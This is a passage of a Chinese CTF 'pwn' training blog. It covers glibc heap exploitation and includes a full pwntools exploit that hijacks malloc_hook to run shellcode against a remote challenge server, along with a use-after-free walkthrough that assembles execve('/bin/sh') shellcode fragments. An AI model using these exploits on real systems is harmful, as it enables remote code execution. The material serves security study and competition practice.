<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__malloc_trim (<span class="keyword">size_t</span> s)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (__malloc_initialized &lt; <span class="number">0</span>)</span><br><span class="line">        ptmalloc_init ();</span><br><span class="line">   </span><br><span class="line">    mstate ar_ptr = &amp;main_arena;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class="line">        result |= mtrim (ar_ptr,s);</span><br><span class="line">        __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">        </span><br><span class="line">        ar_ptr = ar_ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (ar_ptr != &amp;main_arena);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在IDA中的反汇编如下：</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639153745891.png" alt="1639153745891"> </p>
<p>对比发现：“dword_3C4B20”就是“&amp;main_arena”</p>
<p>​        //通常通过“malloc_trim”来<strong>快速锁定</strong>“main_arena”的地址</p>
<p>因为<strong>main_arena的偏移</strong>（main_arena+0x58）和<strong>malloc_hook</strong>很近，只有两位不同</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639153912159.png" alt="1639153912159"> </p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639154237609.png" alt="1639154237609"> </p>
<p>所以可以通过<strong>main_arena</strong>来实现<strong>malloc_hook劫持</strong>，而“malloc_trim”中就有“main_arena”</p>
<p><strong>OFF BY ONE</strong></p>
<p>所谓OFF BY ONE就是利用堆溢出一个字节到下一个堆块，使得目前堆块与下一堆块合并成一个堆块，此时堆块的大小就是我们溢出的那一字节（覆盖了<strong>pre_size</strong>）</p>
<p>​        //也可以溢出多个字节，完全覆盖size位也不是不行</p>
<p>并且堆块的fd(前驱指针)以及bk(后继指针)都会指向<strong>main_arena+XX</strong>的地址</p>
<p>malloc机制中的<strong>unsorted bin</strong>、<strong>small bins</strong>以及<strong>large bins</strong>中的双向链表中的<strong>第一个</strong>chunk以及最 <strong>后一个</strong>chunk中的 fd\bk 字段，都会指向<strong>arena</strong>的<strong>固定偏移</strong></p>
<p>​        //不同的libc版本可能<strong>固定偏移</strong>有差别</p>
<hr>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">49239</span>)</span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>, os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./timu&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size,data</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,size)</span><br><span class="line">	p.sendafter(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,size)</span><br><span class="line">	p.sendafter(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line">	</span><br><span class="line">bss_addr=<span class="number">0x601020</span></span><br><span class="line">buf_addr=<span class="number">0x601040</span></span><br><span class="line">	</span><br><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x90</span>),<span class="string">&quot;buf[0]&quot;</span>)</span><br><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x90</span>),<span class="string">&quot;buf[1]&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)<span class="comment">#0x91&gt;&gt;&gt;fake allocated chunk</span></span><br><span class="line">payload+=p64(buf_addr-<span class="number">0x18</span>)+p64(buf_addr-<span class="number">0x10</span>)<span class="comment">#buf[0]-&gt;buf[-3]</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload+=p64(<span class="number">0x90</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line"><span class="comment">#fake chunk:0x90-0x10=0x80</span></span><br><span class="line"><span class="comment">#chunk1:0x90+0x10=0xa0</span></span><br><span class="line"><span class="comment">#new chunk:0x90+0x90=0x80+0xa0=0x120</span></span><br><span class="line"></span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line">free(<span class="string">&quot;1&quot;</span>)<span class="comment">#merge completed</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(bss_addr)+p64(buf_addr)<span class="comment">#buf[0]-&gt;bss  buf[1]-&gt;buf</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#new chunk:chunk2,chunk3</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)<span class="comment">#size(buf[4])  pre_size(buf[5])</span></span><br><span class="line"><span class="comment">#make a fake chunk in buf(the head is buf[4])</span></span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line"></span><br><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[2]&quot;</span>)<span class="comment">#buf[2]-&gt;chunk2</span></span><br><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[3]&quot;</span>)<span class="comment">#buf[3]-&gt;chunk3</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">&quot;2&quot;</span>)<span class="comment">#chunk3 into unsorted bin</span></span><br><span class="line"><span class="comment">#no merge:chunk1&amp;chunk3 are all allocated chunks</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(buf_addr+<span class="number">0x8</span>*<span class="number">4</span>)<span class="comment">#fd-&gt;null  bk-&gt;buf[4](fake chunk)</span></span><br><span class="line">change(<span class="string">&quot;2&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line"><span class="comment">#link fake chunk into unsorted bin</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[2]&quot;</span>)<span class="comment">#buf[2]-&gt;chunk4</span></span><br><span class="line"><span class="comment">#chunk2 is used,fake chunk is the only one in unsorted bin</span></span><br><span class="line"><span class="comment">#buf[6]-&gt;main arena+0x58  buf[7]-&gt;main arena+0x58</span></span><br><span class="line"></span><br><span class="line">payload=p64(bss_addr)+p64(buf_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x10&#x27;</span></span><br><span class="line">change(<span class="string">&quot;1&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line"><span class="comment">#main arena+0x58 become malloc_hook</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(shellcode)),shellcode)<span class="comment">#bss=&amp;shellcode</span></span><br><span class="line">change(<span class="string">&quot;6&quot;</span>,<span class="string">&quot;8&quot;</span>,p64(bss_addr))<span class="comment">#malloc_hook-&gt;bss(&amp;shellcode)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/07/%E5%A0%86-UAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/07/%E5%A0%86-UAF/" class="post-title-link" itemprop="url">堆+UAF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-12-07 08:51:14" itemprop="dateCreated datePublished" datetime="2021-12-07T08:51:14+08:00">2021-12-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-10 12:48:23" itemprop="dateModified" datetime="2022-01-10T12:48:23+08:00">2022-01-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>我学习pwn已经有一段时间了，遇到了一个有意思的题目，再此分析一下</p>
<p>题目链接： <a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=1&amp;id=4611&amp;page=1">题目 (xctf.org.cn)</a> </p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638852309396.png" class width="1638852309396">         
<p><strong>选项一</strong>可以申请一片内存空间，位置和大小都可以自己定义（空间大小不超过8字节），并且有一次写入的机会，<strong>选项四</strong>可以释放某片内存空间，本程序中没有<strong>BackDoor</strong></p>
<p>当我第一次分析这个题时，而一眼就注意到了<strong>UAF</strong>漏洞，没有<strong>BackDoor</strong>，并且没有开<strong>NX</strong>，由此可以判断：本程序<strong>需要在堆中写入shellcode来获取权限</strong></p>
<hr>
<p><strong>UAF（Use After Free）</strong></p>
<p>如果程序利用“free”，“delete”等函数释放内存时没有置空指针，就会造成UAF漏洞</p>
<p>先看一段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *a;</span><br><span class="line">    a = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);<span class="comment">//申请a</span></span><br><span class="line">    <span class="built_in">memcpy</span>(a,<span class="string">&quot;ywhkkx&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a addr:%x,%s\n&quot;</span>,a,a);</span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">//释放a</span></span><br><span class="line">    <span class="keyword">char</span> *b;</span><br><span class="line">    b = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);<span class="comment">//申请相同大小的b</span></span><br><span class="line">    <span class="built_in">memcpy</span>(a,<span class="string">&quot;isacaib&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b addr:%x,%s\n&quot;</span>,b,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a addr:%x,%s\n&quot;</span>,a,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a addr:6792d2a0,ywhkkx</span><br><span class="line">b addr:6792d2a0,isacaib</span><br><span class="line">a addr:6792d2a0,isacaib</span><br></pre></td></tr></table></figure>
<p>申请“a”后，释放“a”，然后申请相同大小的“b”</p>
<p>根据结果来看，“a”和“b”两个指针指向了同一片内存空间，修改“b”，“a”也发生改变</p>
<p>根本原因：</p>
<p>这里涉及到 <strong>ptmaoolc</strong> 的知识了（一种heap管理算法）：</p>
<p>ptmalloc是glibc默认的内存管理器 </p>
<p>在ptmalloc内部，内存块采用<strong>chunk</strong>管理，并且将大小相似的chunk用链表管理，一个链表被称为一个bin。前64个bin里，相邻的bin内的chunk大小相差8字节，称为<strong>small bin</strong>，后面的是<strong>large bin</strong>，large bin里的chunk按先大小，再最近使用的顺序排列，每次分配都找一个最小的能够使用的chunk </p>
<p><strong>PS：</strong>ptmaoolc算法的行为肯定有利于CPU的运算，具体就不展开了（我也不会）</p>
<p>这里挂两个博客，讲的更详细：</p>
<p>UAF：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31481187/article/details/73612451">https://blog.csdn.net/qq_31481187/article/details/73612451</a></p>
<p>ptmaoolc： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/biterror/p/6913236.html">ptmalloc总结 - bitError - 博客园 (cnblogs.com)</a> </p>
<p>这里还有一个内存分配策略的总结：</p>
<p> <a target="_blank" rel="noopener" href="https://owent.net/2013/867.html">ptmalloc,tcmalloc和jemalloc内存分配策略研究|I’m OWenT</a> </p>
<hr>
<p>本程序可以无限循环，也就是有多次写入的机会，但是仔细分析代码又会出现问题：</p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638853489982.png" class width="1638853489982"> 
<p>一次申请的空间大小不超过8字节，肯定装不下shellcode，所以要多次申请，并把shellcode分段装入这些堆内存空间中</p>
<p>构造如下shellcode：（涉及到64位系统的传参约定）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,xxxx;/<span class="built_in">bin</span>/sh <span class="comment">#字符串的地址</span></span><br><span class="line">mov rax,<span class="number">59</span>; <span class="comment">#execve 的系统调用号</span></span><br><span class="line">mov rsi,<span class="number">0</span>;</span><br><span class="line">mov rdx,<span class="number">0</span>;</span><br><span class="line">syscall</span><br><span class="line">----------------------------</span><br><span class="line">execve(<span class="string">&#x27;/bin/sh&#x27;</span>,null,null)</span><br></pre></td></tr></table></figure>
<p>构造shellcode片段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">codex=asm(<span class="string">&quot;mov rdi,&#x27;/bin/sh&#x27;&quot;</span>)		<span class="comment">#把‘/bin/sh’装入rdi</span></span><br><span class="line">code0=asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)		<span class="comment">#清空rax</span></span><br><span class="line">code1=asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)		<span class="comment">#eax就是rax的低位</span></span><br><span class="line">code2=asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)		<span class="comment">#清空rsi（第2个参数）</span></span><br><span class="line">code3=asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)		<span class="comment">#清空rdx（第3个参数）</span></span><br><span class="line">code4=asm(<span class="string">&#x27;syscall&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>问题：可以发现“codex”的大小明显超过了8字节，这里先放一放</p>
<p>现在需要程序按照这个顺序执行shellcode，但堆与堆之间没有联系，需要用jmp连接</p>
<hr>
<p><strong>IP控制指令：jmp short</strong></p>
<p>jmp short 目标地址，占用2字节，可以按照相对位置进行寻址跳转</p>
<p>机器码：EB + <strong>8位位移</strong></p>
<p>计算公式：相对偏移地址 = 目标地址 - 当前地址 - 2（为什么要“-2”，后续进行分析）</p>
<p>​        //当前地址：jmp指令的地址</p>
<p>要理解这个计算公式首先得搞明白<strong>CPU执行指令的过程</strong>：</p>
<p>1.从CS:IP指向的“内存单元”读取指令，送入指令缓存器</p>
<p>2.（IP）=（IP）+ 所读取指令的长度，从而指向下一条指令</p>
<p>3.执行指令，回到“1”，重复这个过程</p>
<p>案例（“《汇编语言》-王爽 ” 中的例子）：</p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638855433626.png" class width="1638855433626">   
<img src="/2021/12/07/%E5%A0%86-UAF/1638855418915.png" class width="1638855418915"> 
<p>可以发现“jmp short s”和机器码为<strong>EB03</strong>，而jmp自己的地址为<strong>0003</strong></p>
<p>1.CS:IP指向“0003”（EB 03）</p>
<p>2.指令“EB 03”被送入指令缓存器</p>
<p>3.（IP）=（IP）+ 2 = 0005H ，CS:IP 指向 add ax,1</p>
<p>4.CPU执行指令缓存器中的指令“EB 03”</p>
<p>5.指令执行后，（IP）= 0008H ，CS:IP 指向 inc ax</p>
<p>可以发现，指令“EB 03”执行以后，CS:IP立马完成了跳转，IP的变化为“0005H&gt;&gt;&gt;00008H”（<strong>差3</strong>）</p>
<p>所以jmp中的目的地址是<strong>计算</strong>出来的：指令执行前IP的指向 + EB后的数值</p>
<p>​        //因为是先进行<strong>2</strong>然后再进行<strong>4</strong>，所以计算公式中的“-2”就是减去“jmp short s”指令的长度</p>
<hr>
<p>那么EB后面的<strong>8位位移</strong>该写多少呢？</p>
<p>这里需要先有<strong>64位堆结构</strong>和<strong>内存对齐</strong>的知识</p>
<hr>
<p><strong>完全二叉树特点</strong></p>
<p>1.叶子结点只可能在最大两层出现</p>
<p>2.对于任意一结点，如果其<strong>右子树</strong>的最大层次为L，则其<strong>左子树</strong>的最大层次为L+1</p>
<p>​        //子树左对齐，不管右子树的有无，左子树一定存在（叶子结点除外）</p>
<p>3.度为1的结点只有0或1个</p>
<p>简而言之，完全二叉数就是一个“顺序填充”的过程：</p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638682361768.png" class width="1638682361768"> 
<p>数据会从左往右依次填充，直到某一层填满然后填下一层</p>
<p><strong>64位堆结构</strong></p>
<p>堆总是一棵完全二叉树 </p>
<p>linux的堆内存管理分为三个层次，分别为<strong>分配区area</strong>、<strong>堆heap</strong>和<strong>内存块chunk</strong></p>
<p>每次glibc分配的内存块称为chunk（函数“malloc”分配的内存）</p>
<p>内存块 chunk ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>prev_size：<strong>相邻的前一个堆块大小</strong>。这个字段只有在前一个堆块（且该堆块为<code>normal chunk</code>）处于<strong>释放状态</strong>时才有意义。这个字段最重要（甚至是唯一）的作用就是用于<strong>堆块释放时快速和相邻的前一个空闲堆块融合</strong>。该字段不计入当前堆块的大小计算。在前一个堆块不处于空闲状态时，数据为前一个堆块中用户写入的数据。libc这么做的原因主要是可以节约4个字节的内存空间，但为了这点空间效率导致了很多安全问题</li>
<li>size：本堆块的长度。长度计算方式：<strong>size字段长度+用户申请的长度+对齐</strong>。libc以 <strong>size_T 长度 * 2</strong> 为粒度对齐。例如 <strong>32bit</strong> 以 4 <em> 2= <strong>8byte</strong> 对齐，<strong>64bit</strong> 以 **8 </em> 2=0×10<strong> 对齐。因为最少以8字节对齐，所以size一定是8的倍数，</strong>故size字段的最后三位恒为0<strong>，libc用这三个bit做标志flag。比较关键的是最后一个bit（pre_inuse），用于指示相邻的前一个堆块是alloc还是free。如果正在使用，则 bit=1。libc判断 </strong>当前堆块是否处于free状态的方法<strong> 就是 判断下一个堆块的 </strong>pre_inuse** 是否为 1 。这里也是 <code>double free</code> 和 <code>null byte offset</code> 等漏洞利用的关键</li>
<li>fd&amp;bk：双向指针，用于组成一个双向空闲链表。故这两个字段<strong>只有在堆块free后</strong>才有意义。堆块在alloc状态时，这两个字段内容是用户填充的数据。<strong>两个字段可以造成内存泄漏（libc的bss地址），Dw shoot等效果</strong></li>
<li>值得一提的是，堆块根据大小，libc使用fastbin、chunk等逻辑上的结构代表，但其存储结构上都是malloc_chunk结构，只是各个字段略有区别，如fastbin相对于chunk，不使用bk这个指针，因为fastbin freelist是个单向链表</li>
</ul>
<p><strong>内存对齐</strong></p>
<p>内存对齐和地址对齐一样，也是一种<strong>时空权衡</strong></p>
<p>glibc的堆内存对齐机制：</p>
<p>32位：<br>最少分配16字节堆，8字节对齐，每次增加8<br>其中4字节为头部，申请1-12堆，分配16字节堆</p>
<p>64位：<br>最少分配32字节堆，16字节对齐，每次增加16<br>其中8字节为头部，申请1-24堆，分配32字节堆</p>
<p>​        //16个字节头部，包括为数据区的 prev_size</p>
<p>可以参考一下链接：</p>
<p>堆利用： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/9416792.html#:~:text=prev_size%20%EF%BC%9A%20%E7%9B%B8%E9%82%BB%E7%9A%84%E5%89%8D%E4%B8%80%E4%B8%AA%E5%A0%86%E5%9D%97%E5%A4%A7%E5%B0%8F%20%E3%80%82%20%E8%BF%99%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%8F%AA%E6%9C%89%E5%9C%A8%E5%89%8D%E4%">pwn with glibc heap（堆利用手册） - hac425 - 博客园 (cnblogs.com)</a></p>
<hr>
<p>64位程序一次性分配的最小堆字节为32</p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638865453036.png" class width="1638865453036"> 
<p>而静态数组“2020A0[v1]”的类型为“qword”（4字，32字节），刚好等于申请堆空间的最小值</p>
<p>所以只要“v1”是连续的，那么申请出来的堆空间就是连续的</p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638785857155.png" class width="1638785857155"> 
<p>在内存块的结构中：<strong>fd&amp;bk</strong>作为数据区，shellcode和jmp都要写在这里</p>
<p>执行jmp后程序需要跳转到下一个<strong>fd&amp;bk</strong>（数据区）</p>
<p>计算：EB <strong>8位位移</strong> =  2 + 1 + 8 + 8 + 8 - 2 = 25（0x19） </p>
<p>根据程序输入函数的算法，<strong>最后1字节</strong>的数据会被强行改为“0”，所以后面8字节的空数据不能使用</p>
<p>所以真正可以利用的空间就只有<strong>7字节</strong>，除去<strong>2字节</strong>的jmp，就只剩下<strong>5字节</strong>了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">codex=(asm(<span class="string">&quot;mov rdi,&#x27;/bin/sh&#x27;&quot;</span>+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)<span class="comment">#明显超范围了</span></span><br><span class="line">code0=(asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)<span class="comment">#左填充“\x90”保证7字节（右对齐）</span></span><br><span class="line">code1=(asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)+<span class="string">&#x27;\xeb\x19&#x27;</span>)</span><br><span class="line">code2=(asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code3=(asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)+<span 